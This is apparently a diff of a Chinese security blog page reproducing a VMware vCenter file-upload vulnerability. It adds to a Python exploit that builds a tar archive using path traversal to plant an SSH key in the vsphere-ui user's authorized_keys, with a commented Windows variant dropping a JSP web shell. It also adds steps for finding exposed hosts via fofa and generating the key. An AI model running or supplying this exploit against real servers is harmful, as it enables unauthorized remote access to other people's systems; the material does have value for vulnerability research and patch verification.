@@ -481,14 +481,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 
@@ -651,7 +651,11 @@ proxies <span class="token operator">=</span> <span class="token punctuation">{<
     <span class="token keyword">with</span> tarfile<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"test.tar"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>
         payload <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
         id_rsa_pub <span class="token operator">=</span> <span class="token string">'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwgGuwNdSGHKvzHsHt7QImwwJ08Wa/+gHXOt+VwZTD23rLwCGVeYmfKObDY0uFfe2O4jr+sPamgA8As4LwdqtkadBPR+EzZB+PlS66RcVnUnDU4UdMhQjhyj/uv3pdtugugJpB9xaLdrUWwGoOLYA/djxD5hmojGdoYydBezsNhj2xXRyaoq3AZVqh1YLlhpwKnzhodk12a7/7EU+6Zj/ee5jktEwkBsVsDLTTWPpSnzK7r+kAHkbYx8fvO3Fk+9jlwadgbmhHJrpPr8gLEhwvrEnPcK1/j+QXvVkgy2cuYxl9GCUPv2wgZCN50f3wQlaJiektm2S9WkN5dLDdX+X4w=='</span>
+        <span class="token comment" spellcheck="true"># 针对Linux有效的方式</span>
         tarinfo <span class="token operator">=</span> tarfile<span class="token punctuation">.</span>TarInfo<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'../../../home/vsphere-ui/.ssh/authorized_keys'</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># Windows 需要改一下</span>
+        <span class="token comment" spellcheck="true">#tarinfo = tarfile.TarInfo(name="..\\..\\ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\statsreport\\test.jsp")</span>
+
         f1 <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>id_rsa_pub<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
         tarinfo<span class="token punctuation">.</span>size <span class="token operator">=</span> len<span class="token punctuation">(</span>f1<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
         f1<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
@@ -663,6 +667,8 @@ proxies <span class="token operator">=</span> <span class="token punctuation">{<
     <span class="token keyword">try</span><span class="token punctuation">:</span>
         r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span>verify <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
         <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># windows下：</span>
+        <span class="token comment" spellcheck="true">#         print('shell地址:/statsreport/test.jsp')</span>
     <span class="token keyword">except</span><span class="token punctuation">:</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flase'</span><span class="token punctuation">)</span>
 
@@ -673,12 +679,19 @@ proxies <span class="token operator">=</span> <span class="token punctuation">{<
         getshell<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
     <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
         <span class="token keyword">raise</span> e
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.fofa搜索<code>title="+ ID_VC_Welcome +"</code></p>
 <p>可以用批量脚本通过fofa把所有搜索到的资产下载到本地</p>
 <p><img src="http://image.xpshuai.cn/vmware_vul1.jpg" alt=""></p>
 <p>2.然后使用POC验证漏洞：</p>
 <p><img src="http://image.xpshuai.cn/vmware_vul2.jpg" alt=""></p>
+<p>3.1 添加一个vsphere-ui用户：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">adduser vsphere-ui
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>3.2 生成 ssh密钥</p>
+<pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa
+<span class="token comment" spellcheck="true"># 然后复制公钥到上面的EXP中去</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>3.对于存在漏洞的资产，使用EXP上传tar文件</p>
 <p><img src="http://image.xpshuai.cn/vmware_vul3.jpg" alt=""></p>
 <p>成功上传<code>authorized_keys</code></p>
@@ -1269,7 +1282,7 @@ Reflection（反射）是被视为动态语言的关键，反射机制允许程�
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">442.2k</span>&nbsp;字
+                class="white-color">442.3k</span>&nbsp;字
             
             
             
